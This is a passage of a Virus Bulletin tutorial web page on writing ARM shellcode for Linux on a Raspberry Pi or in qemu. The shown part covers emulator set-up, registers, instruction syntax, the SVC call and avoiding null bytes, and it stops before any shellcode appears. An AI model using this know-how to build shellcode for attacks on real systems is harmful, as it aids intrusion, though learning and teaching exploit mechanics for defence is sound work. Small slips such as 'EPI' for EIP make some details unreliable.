<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Shellcoding ARM</title>
<meta name="description" content="With recent studies reporting a dramatic increase in the usage of mobile devices, a decrease in sales of PCs and notebooks, and ‘BYOD’ being the hot trend of the moment, it is no longer possible to ignore non-x86 architectures. Aleksander Czarnowski provides a basic starting point for understanding how to write shellcode on ARM based CPUs." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1765;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201301-Shellcoding-ARM"></a>Shellcoding ARM</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2013-01-08</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="surname">Aleksander P. Czarnowski</span></h3><span class="orgname">AVET Information and Network Security</span>, <span class="orgdiv">Poland</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>With recent studies reporting a dramatic increase in the usage of mobile devices, a decrease in sales of PCs and notebooks, and &lsquo;BYOD&rsquo; being the hot trend of the moment, it is no longer possible to ignore non-x86 architectures. Aleksander Czarnowski provides a basic starting point for understanding how to write shellcode on ARM based CPUs.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2013 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2754" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2754" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3916462"></a></span></dt><dt><span class="sect1"><a href="#id4155153">ARM naming convention</a></span></dt><dt><span class="sect1"><a href="#id2802456">Target architecture</a></span></dt><dt><span class="sect1"><a href="#id4899629">The set-up</a></span></dt><dt><span class="sect1"><a href="#id3392927">Building and running qemu with ARM 1176 support</a></span></dt><dt><span class="sect1"><a href="#id4058841">Processor operating states</a></span></dt><dt><span class="sect1"><a href="#id2439874">Processor operating modes</a></span></dt><dt><span class="sect1"><a href="#id4447990">Registers</a></span></dt><dt><span class="sect1"><a href="#id4124981">CPSR register description</a></span></dt><dt><span class="sect1"><a href="#id3755415">Basic instructions</a></span></dt><dt><span class="sect1"><a href="#id4310906">MOV and LDR (and STR)</a></span></dt><dt><span class="sect1"><a href="#id3622819">INT, SVC, SWI?</a></span></dt><dt><span class="sect1"><a href="#id4949536">Branches and calls</a></span></dt><dt><span class="sect1"><a href="#id4769963">Stack operation and procedure calling</a></span></dt><dt><span class="sect1"><a href="#id3727558">NOP</a></span></dt><dt><span class="sect1"><a href="#id4333698">Getting required syscalls</a></span></dt><dt><span class="sect1"><a href="#id4361891">Getting required instructions</a></span></dt><dt><span class="sect1"><a href="#id2116912">Testing out shellcode</a></span></dt><dt><span class="sect1"><a href="#id2141764">Final execve shellcode</a></span></dt><dt><span class="sect1"><a href="#id3755324">Notes on shellcode execution</a></span></dt><dt><span class="sect1"><a href="#id3980241">Some final thoughts</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3916462"></a></h2></div></div></div><p>With recent studies reporting a dramatic increase in the usage of mobile devices, a decrease in sales of PCs and notebooks, and &lsquo;BYOD&rsquo; being the hot trend of the moment, it is no longer possible to ignore non-x86 architectures. The aim of this article to is to provide a basic starting point for understanding how to write shellcode on ARM based CPUs. Background knowledge from x86/x64 may be helpful, but keep in mind that in some areas ARM is a completely different beast from IA32.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4155153"></a>ARM naming convention</h2></div></div></div><p>The first problem with the ARM architecture is the naming convention. First, ARM is an IP core being sold as a licence. Therefore there are a number of different CPUs from different manufacturers with different specifications based on the same core. To make matters worse, there are two concepts which cannot be used interchangeably: architecture and family. <a href="#table.1">Table 1</a> sheds some light on the ARM naming convention nightmare.</p><div class="table"><a id="table.1"></a><table border="1" summary="The ARM naming convention nightmare."><colgroup><col /><col /></colgroup><thead><tr><th align="center">ARM architecture</th><th align="center">ARM family</th></tr></thead><tbody><tr><td>ARMv1</td><td>ARM1</td></tr><tr><td>ARMv2</td><td>ARM2, ARM3</td></tr><tr><td>ARMv3</td><td>ARM6, ARM7</td></tr><tr><td>ARMv4</td><td>StrongARM, ARM7TDMI, ARM9TDMI</td></tr><tr><td>ARMv5</td><td>ARM7EJ, ARM9E, ARM10E, XScale</td></tr><tr><td>ARMv6</td><td>ARM11, ARM CORTEX-M</td></tr><tr><td>ARMv7</td><td>ARM Cortex-A, ARM Cortex-M, ARM Cortex-R</td></tr><tr><td>ARMv8</td><td>No cores were available at the time of writing this article. ARMv8 will support 64-bit data and addressing mode.</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;The ARM naming convention nightmare.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2802456"></a>Target architecture</h2></div></div></div><p>When I first came up with the idea for this tutorial I had difficulty deciding on the right target architecture. Then my <span class="emphasis"><em>Raspberry Pi </em></span>[<span class="citation"><a href="#citation.1">1</a></span>] package arrived and the problem was solved &ndash; <span class="emphasis"><em>Raspberry Pi</em></span> (<span class="emphasis"><em>RPi</em></span>) is a standalone ARM11 (ARMv6) based system with <span class="emphasis"><em>Linux</em></span> (<span class="emphasis"><em>Raspbian</em></span>, which is based on <span class="emphasis"><em>Debian</em></span>) and <span class="emphasis"><em>Android</em></span> platforms available.</p><p><span class="emphasis"><em>RPi </em></span>costs around $35 (Rev B with two USB ports and an Ethernet port) and is a great target architecture for educational purposes. Thanks to freely available <span class="emphasis"><em>Raspbian</em></span> &lsquo;wheezy&rsquo; images and support for <span class="emphasis"><em>RPi</em></span> emulation in <span class="emphasis"><em>qemu</em></span>, we have a perfect ARMv6 target to experiment with at a more than affordable price.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4899629"></a>The set-up</h2></div></div></div><p>Throughout this tutorial we will be using <span class="emphasis"><em>Raspberry Pi </em></span>with <span class="emphasis"><em>Raspbian</em></span> &lsquo;wheezy&rsquo; (which is based on <span class="emphasis"><em>Debian</em></span>) <span class="emphasis"><em>armhf</em></span>. Do not mix this up with <span class="emphasis"><em>Raspbian</em></span> for <span class="emphasis"><em>armel</em></span> (which means a slower soft-float ABI). It is crucial not to mix up binaries based on certain ABIs (e.g. <span class="emphasis"><em>armhf</em></span> and <span class="emphasis"><em>armel</em></span>), since <span class="emphasis"><em>Raspbian</em></span> does not currently support this.</p><p>As a second development platform, <span class="emphasis"><em>Ubuntu 12.04 LTS i386 </em></span>was used both for <span class="emphasis"><em>qemu</em></span> and other tools.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3392927"></a>Building and running qemu with ARM 1176 support</h2></div></div></div><p>If you don&rsquo;t want to buy <span class="emphasis"><em>Raspberry Pi</em></span> or you want to play with ARM architecture while you are on the go, <span class="emphasis"><em>qemu</em></span> is the answer. The only problem is that ARM1176 support is relatively new, so not every <span class="emphasis"><em>qemu</em></span> build/package supports it. You can check if your <span class="emphasis"><em>qemu</em></span> build has proper support by issuing the following command:</p><pre class="programlisting">qemu-system-arm -cpu ?</pre><p>If &lsquo;arm1176&rsquo; is on the list then you can skip the rest of this section. Another test is to boot <span class="emphasis"><em>qemu</em></span> with the option &lsquo;&ndash;cpu arm 1176&rsquo;. If during the boot up some information is displayed regarding unsupported instructions, your <span class="emphasis"><em>qemu</em></span> installation needs upgrading.</p><p>If your <span class="emphasis"><em>qemu</em></span> package does not have ARM1176 support you can build it from the source. Fortunately, the process is quite simple, assuming you have a properly installed gcc-based build environment (such as build-essentials in the case of <span class="emphasis"><em>Ubuntu</em></span>):</p><div class="orderedlist"><ol type="1"><li><p>Create a target directory for compiling <span class="emphasis"><em>qemu</em></span> sources</p></li><li><p>Change to that target directory and clone the qemu git repository by issuing the following command:</p><pre class="programlisting">git clone http://git.qemu.org/qemu.git </pre></li><li><p>Change directory to &#39;qemu&#39;</p></li><li><p>Issue the command:</p><pre class="programlisting">git pull &ndash;rebase </pre><p>(at the top of the git repository)</p></li><li><p>Issue a configure command (make sure you use the proper path for SDL): </p><pre class="programlisting">./configure --target-list=&ldquo;arm softmmu arm-linux-user&rdquo; --enable-sdl --prefix=/usr</pre></li><li><p>Issue the command:</p><pre class="programlisting">make command</pre></li><li><p>As root, issue the command:</p><pre class="programlisting">make install</pre><p>(only if you want to install your qemu version &ndash; under some circumstances this might not be required).</p></li></ol></div><p>If compilation proceeds without problems, after step 6 you should have a ready to-use version of <span class="emphasis"><em>qemu</em></span> that can run the <span class="emphasis"><em>Raspbian</em></span> wheezy image. In order to do that you need to:</p><div class="itemizedlist"><ul type="disc"><li><p>Download the <span class="emphasis"><em>Raspbian</em></span> image from raspberrypi.org</p></li><li><p>Download the dedicated <span class="emphasis"><em>qemu</em></span> kernel image from <a href="http://xecdesign.com/downloads/linux-qemu/kernel-qemu" target="_blank">http://xecdesign.com/downloads/linux-qemu/kernel-qemu</a>.</p></li></ul></div><p>Now you can run your <span class="emphasis"><em>qemu</em></span>-based <span class="emphasis"><em>Raspberry Pi </em></span>with the following command (adjust the hda image name to your own needs):</p><pre class="programlisting">qemu-system-arm -kernel kernel-qemu -cpu arm1176 -m 256 -M versatilepb -no-reboot -serial stdio -append 
&ldquo;root=/dev/sda2 panic=1&rdquo; -hda 2012-10-28-wheezy-raspbian.img</pre><p>More detailed instructions for building <span class="emphasis"><em>qemu</em></span> and a kernel for R<span class="emphasis"><em>aspberry Pi </em></span>can be found in [<span class="citation"><a href="#citation.2">2</a></span>] and [<span class="citation"><a href="#citation.3">3</a></span>].</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4058841"></a>Processor operating states</h2></div></div></div><p>The BCM2835 system on chip (SoC) includes an ARM1176JZF-S processor, which belongs to the ARMv6 architecture family. The BCM2835 chip also contains the VideoCore IV GPU, which is not open source and its description is beyond the scope of this article. For the <span class="emphasis"><em>RPi</em></span> system the GPU is important not only for graphics handling but it is also the first processor of the whole system which gets control and enables third-party operating systems to boot besides the included firmware (often called binary blob).</p><p>The ARM1176JZF-S processor can operate in one of three states:</p><div class="itemizedlist"><ul type="disc"><li><p>ARM state &ndash; 32-bit, word-aligned ARM instructions are executed</p></li><li><p>Thumb state &ndash; 16-bit, halfword-aligned Thumb instructions are executed</p></li><li><p>Jazelle state &ndash; variable length, byte-aligned Java instructions are executed.</p></li></ul></div><p>Switching from one state to another is done by executing proper instructions and setting up certain registers:</p><div class="itemizedlist"><ul type="disc"><li><p>BX and BLX instructions load the PC register and are used to switch between ARM and Thumb state</p></li><li><p>The BXJ instruction is used for Jazelle state, which is outside the scope of this tutorial.</p></li></ul></div><p>In the case of ARM1176JZF-S, all exceptions are entered, handled and exited in ARM state even if the processor is in Thumb or Jazelle state. If Thumb or Jazelle state is being used the CPU enables a smooth transition from the ARM exception handler to the previous state.</p><p>Additionally, the CPU allows ARM and Thumb code to mix.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2439874"></a>Processor operating modes</h2></div></div></div><p>Besides processor states, the discussed ARM core supports a number of different operation modes:</p><div class="itemizedlist"><ul type="disc"><li><p>User &ndash; normal operation</p></li><li><p>FIQ &ndash; fast interrupt processing</p></li><li><p>IRQ &ndash; general purpose interrupt handling</p></li><li><p>Supervisor &ndash; processing software interrupts (SVC/SWI) and this is protected mode for the OS</p></li><li><p>Abort &ndash; processing memory faults (data abort or prefetch abort)</p></li><li><p>Undef &ndash; handling undefined instruction exceptions</p></li><li><p>System &ndash; privilege operating system tasks</p></li><li><p>Secure Monitor &ndash; part of the TrustZone extension mechanism.</p></li></ul></div><p>The system mode is kept in bits 4&ndash;0 of the CPSR register. It is important to remember that some modes keep their own copy of CPU registers, however from a programmer&rsquo;s perspective the same number of registers always have to be accessed, only the accessed values differ.</p><p>All modes except user mode are known as privilege modes, which means they can be used to access system protected resources and to service both exceptions and interrupts.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4447990"></a>Registers</h2></div></div></div><p>In all operating modes there are at least 16 registers available, from R0 to R15. Similarly to x86 architecture, some registers have dedicated functions and cannot be used interchangeably with other registers (<a href="#table.2">Table 2</a>).</p><div class="table"><a id="table.2"></a><table border="1" summary="Registers and their functions."><colgroup><col /><col /><col /><col /></colgroup><thead><tr><th align="center">Register</th><th align="center">Alias</th><th align="center">Register description</th><th align="center">x86 equivalent and notes</th></tr></thead><tbody><tr><td>R13</td><td>sp / SP</td><td>Stack pointer</td><td>ESP (RSP is 64 bytes wide so it does not apply to 32-bit ARM architecture). There is no EBP-like register in ARM by CPU design.</td></tr><tr><td>R14</td><td>lr / LR</td><td>Link register: the branch with link (BL) instruction puts the address of the next instruction following the branch instruction into the lr register. This enables sub procedures to be called and to return from them to the caller.</td><td>There is no direct equivalent in x86 or AMD64 architecture. Instead the stack is used.</td></tr><tr><td>R15</td><td>pc / PC</td><td>Program counter: holds the address of the next instruction the CPU will execute (instruction to be fetched for execution).</td><td>EPI (RPI is 64 bytes wide so it does not apply to 32-bit ARM architecture).</td></tr><tr><td>CPSR</td><td>N/A</td><td>Current Program Status Register: holds current flags, status bits and current mode bits.</td><td>EFLAGS register.</td></tr><tr><td>SPSR</td><td>N/A</td><td>Save Program Status Register: this is accessible only when in one of the privileged modes. As the name implies the register contains the state of the executed program (flags, status bits and current mode bits).</td><td>EFLAGS saved on the stack could be considered similar.</td></tr></tbody></table><p class="title"><b>Table&nbsp;2.&nbsp;Registers and their functions.</b></p></div><p>The PC (R15) register behaves differently depending on processor operating state:</p><div class="itemizedlist"><ul type="disc"><li><p>In Thumb state PC bit 1 is used to select between alternate halfwords</p></li><li><p>In Jazelle state all instruction fetches are in words.</p></li></ul></div><p>Since Thumb state is a subset of ARM state, Thumb registers are a little different:</p><div class="itemizedlist"><ul type="disc"><li><p>Only registers R0&ndash;R7 are available</p></li><li><p>PC register is available</p></li><li><p>SP register is available</p></li><li><p>LR register is available</p></li><li><p>CPSR register is available.</p></li></ul></div><p>All Thumb state registers are mapped into ARM stated registers of the same names.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4124981"></a>CPSR register description</h2></div></div></div><p><a href="#figure.1">Figure 1</a> shows the CPSR register from the ARM1176JZF-S Technical Reference Manual.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="CPSR register." src="/uploads/images/figures/2013/01/Shellcoding-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;CPSR register.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3755415"></a>Basic instructions</h2></div></div></div><p>To understand the ARM instruction set one needs to understand how it is built. There are a few simple rules that, when followed correctly, enable you to quickly grasp ARM assembly.</p><p>Historically, ARM has two notations for instructions. The older one:</p><pre class="programlisting">&lt;instruction&gt;{&lt;cond&gt;}{S} &lt;operands&gt;</pre><p>and the alternative form based on Universal Assembly Language (UAL) which uses the same notation for ARM and Thumb instructions:</p><pre class="programlisting">&lt;instruction&gt;{S}{&lt;cond&gt;} &lt;operands&gt;</pre><p>The fields in brackets are optional. The fields between &lsquo;&lt;&rsquo; and &lsquo;&gt;&rsquo; are required, and only certain values will be accepted by the assembler.</p><p>Most instructions have two or three operands. For example, the memory and register access instructions usually have two operands while arithmetic instructions like ADD have three.</p><p>The {S} field states whether the instruction should modify the CPSR due to the result of an operation or not. For example:</p><div class="itemizedlist"><ul type="disc"><li><p>The result of executing the ADD r2, r3, r4 instruction will be stored in the destination register, however the result of the operation will not be reflected in the CPSR flags N, V, Z and C.</p></li><li><p>The result of executing the ADDS r2, r3, r4 instruction will be stored in the destination register and the result of the operation will change the N, V, Z and C flags in the CPSR register accordingly.</p></li></ul></div><p>Some of the possible values for the condition field are shown in <a href="#table.3">Table 3</a>.</p><div class="table"><a id="table.3"></a><table border="1" summary="Some of the possible values for the condition field."><colgroup><col /><col /><col /></colgroup><thead><tr><th align="center">Cond field mnemonic</th><th align="center">Meaning</th><th align="center">Flag status for condition to be met</th></tr></thead><tbody><tr><td>EQ</td><td>Equal</td><td>Z flag set</td></tr><tr><td>NE</td><td>Not equal</td><td>Z flag clear</td></tr><tr><td>CS</td><td>Carry set</td><td>C flag set</td></tr><tr><td>CC</td><td>Carry clear</td><td>C flag clear</td></tr></tbody></table><p class="title"><b>Table&nbsp;3.&nbsp;Some of the possible values for the condition field.</b></p></div><p>For a complete list of possible conditional field mnemonics and their meaning, please consult your core ARM Technical Reference.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4310906"></a>MOV and LDR (and STR)</h2></div></div></div><p>These instructions look quite similar at first, but they are different. Another quirk is that the LDR mnemonic is in fact a pseudo instruction.</p><p>The format for the MOV instruction is as follows:</p><pre class="programlisting">MOV{S}{&lt;cond&gt;} &lt;Rd&gt;, &lt;shifter_operand&gt;</pre><p>The result is stored in &lt;Rd&gt; and it is equal to the value of &lt;shifter_operand&gt;.</p><p>For example:</p><pre class="programlisting">MOV r4, r6</pre><p>means that the value of the r6 register is copied to the r4 register. Another example with immediate value:</p><pre class="programlisting">MOV r8, #25</pre><p>means that the value of the r8 register equals 25. Most ARM assemblers assume decimal values by default unless a different notation has been used.</p><p>To understand why the LDR instruction is also available in RISC architecture like ARM you need to understand one crucial MOV limitation: the immediate value on which MOV can operate is in the range between 0 and 255 decimal. But registers are 32 bits wide, so how can we store immediate values that are bigger than eight bits in them? This is where the LDR instruction comes to the rescue. Another important feature of LDR is its ability to read from memory.</p><p>Just like MOV, LDR takes only two arguments:</p><pre class="programlisting">LDR{&lt;cond&gt;} &lt;Rd&gt;, &lt;addressing mode&gt;</pre><p>For example:</p><pre class="programlisting">LDR r0,=0x20200000</pre><p>stores the value 0x20200000 (hexadecimal) in the r0 register. Note that the equals sign that precedes the immediate value is a requirement.</p><p>Another important instruction is STR, which is the reverse of LDR &ndash; it enables data to be stored (written) in memory. Its format is exactly the same as for the LDR instruction:</p><pre class="programlisting">STR{&lt;cond&gt;} &lt;Rd&gt;, &lt;addressing mode&gt;</pre><p>However, STR treats its arguments differently. The &lt;Rd&gt; is the source, while &lt;addressing mode&gt; is the destination &ndash; which is the opposite to LDR.</p><p>Simple operations such as addition and subtraction are supported by ADD and SUB instructions: </p><pre class="programlisting">ADD{S}{&lt;cond&gt;} &lt;Rd&gt;, &lt;Rn&gt;, &lt;shifter_operand&gt;
SUB{S}{&lt;cond&gt;} &lt;Rd&gt;, &lt;Rn&gt;, &lt;shifter_operand&gt;
</pre><p>The result of the operation on &lt;Rn&gt; and &lt;shifter_operand&gt; is stored in &lt;Rd&gt;.</p><p>For example:</p><pre class="programlisting">ADD r1, r2, r3</pre><p>is equal to r1=r2+r3,</p><pre class="programlisting">ADD r1, r6, #4</pre><p>is equal to r1=r6+4,</p><pre class="programlisting">SUB r1, r6, #4</pre><p>is equal to r1=r6-4.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3622819"></a>INT, SVC, SWI?</h2></div></div></div><p>On x86, interrupts (among many other functions) have historically been used in different operating platforms to provide easy access to the underlying API:</p><div class="itemizedlist"><ul type="disc"><li><p>BIOS provided the INT 10h and INT 13h interfaces for video display and disk access.</p></li><li><p>DOS provided INT 21h to enable DOS applications to access most of its APIs.</p></li><li><p><span class="emphasis"><em>Windows</em></span> provided INT 2Fh (<span class="emphasis"><em>Windows</em></span> later switched to the MSR-based SYSCALL mechanism).</p></li><li><p><span class="emphasis"><em>Linux</em></span> provided INT 80h for system calls.</p></li></ul></div><p>In the case of ARM-based <span class="emphasis"><em>Linux</em></span> systems, the INT 80h interface call has been changed to the native ARM interrupt call: SVC n.</p><p>There is some confusion around the SVC instruction since in older assembler and ARM documentation this instruction was called SWI (SoftWare Interrupt). In fact, even some recent publications still use the SWI name. Both mnemonics describe the same ARM opcode and therefore not only have the same meaning but also operate identically. To cut a confusing story short: SWI has been renamed to SVC but there are no differences between the two instructions. However, to stick with the current naming convention, the SVC mnemonic will be used in the rest of this article.</p><p>While on x86 the number after the INT instruction denotes which interrupt should be triggered, the number after SVC is not a software interrupt number. Instead this is additional information that can be passed to the interrupt handler. Whether this value has some meaning and will be processed by the handler depends on the underlying operating system and the ARM core has nothing to do with it.</p><p>The default <span class="emphasis"><em>Linux</em></span> call passes a 0x00 value and looks like this:</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Example of bad bytes in instruction encoding." src="/uploads/images/figures/2013/01/Shellcoding-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Example of bad bytes in instruction encoding.</b></p></div><p>From the shellcode perspective any null byte is a bad byte as it will mark the end of a string in the case of C string manipulation functions like strcpy(), for example. Fortunately, since <span class="emphasis"><em>Linux</em></span> is not using a passed value it can be changed to something else, resolving the null bytes issue.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4949536"></a>Branches and calls</h2></div></div></div><p>Besides the SVC instruction or exception, another way to change the flow execution is based on branch instructions &ndash; see <a href="#table.4">Table 4</a>.</p><div class="table"><a id="table.4"></a><table border="1" summary="Mnemonics and their meanings."><colgroup><col /><col /><col /></colgroup><thead><tr><th align="center">Mnemonic</th><th align="center">Meaning</th><th align="center">Description</th></tr></thead><tbody><tr><td>B &lt;address&gt;</td><td>Branch to &lt;address&gt;</td><td>Unconditional jump to address/label</td></tr><tr><td>B{&lt;cond&gt;} label</td><td>Conditional jump to &lt;address&gt;</td><td>Conditional jump to address/label</td></tr><tr><td>BL &lt;address&gt;</td><td>Branch with link to &lt;address&gt;</td><td>Used to call procedures &ndash; BL copies the address of the next instruction into the LR register (R14)</td></tr><tr><td>BX &lt;address&gt;</td><td>Branch and exchange</td><td>Used to switch between ARM and Thumb state</td></tr><tr><td>BLX &lt;address&gt;</td><td>Branch, link and exchange</td><td>Used to switch between ARM and Thumb state. Just like BL it copies the address of the next instruction into the LR register (R14)</td></tr></tbody></table><p class="title"><b>Table&nbsp;4.&nbsp;Mnemonics and their meanings.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4769963"></a>Stack operation and procedure calling</h2></div></div></div><p>ARM supports basic stack operation through POP and PUSH instructions:</p><pre class="programlisting">POP {&lt;cond&gt;} reglist
PUSH {&lt;cond&gt;} reglist
</pre><p>For example:</p><pre class="programlisting">PUSH {r2,lr}</pre><p>Or:</p><pre class="programlisting">POP {r0,r10,pc}</pre><p>The stack is in descending order. Pushing the LR register and later popping the PC register from the stack is typical ARM prolog and epilog of a procedure called with the BL instruction.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3727558"></a>NOP</h2></div></div></div><p>One of the most important instructions for shellcode programmers is NOP. Fortunately, ARM supports the NOP instruction &ndash; which results in no operation.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4333698"></a>Getting required syscalls</h2></div></div></div><p>On x86 based <span class="emphasis"><em>Linux</em></span> systems syscall numbers (passed to INT 80h) are kept in /usr/include/asm/unistd.h (in fact, in recent <span class="emphasis"><em>Linux</em></span> distros this file contains just a C pre-processor definition to include asm/unistd_32.h or asm/unistd_64.h depending on the CPU used). Getting syscall numbers is no different in the case of ARM based <span 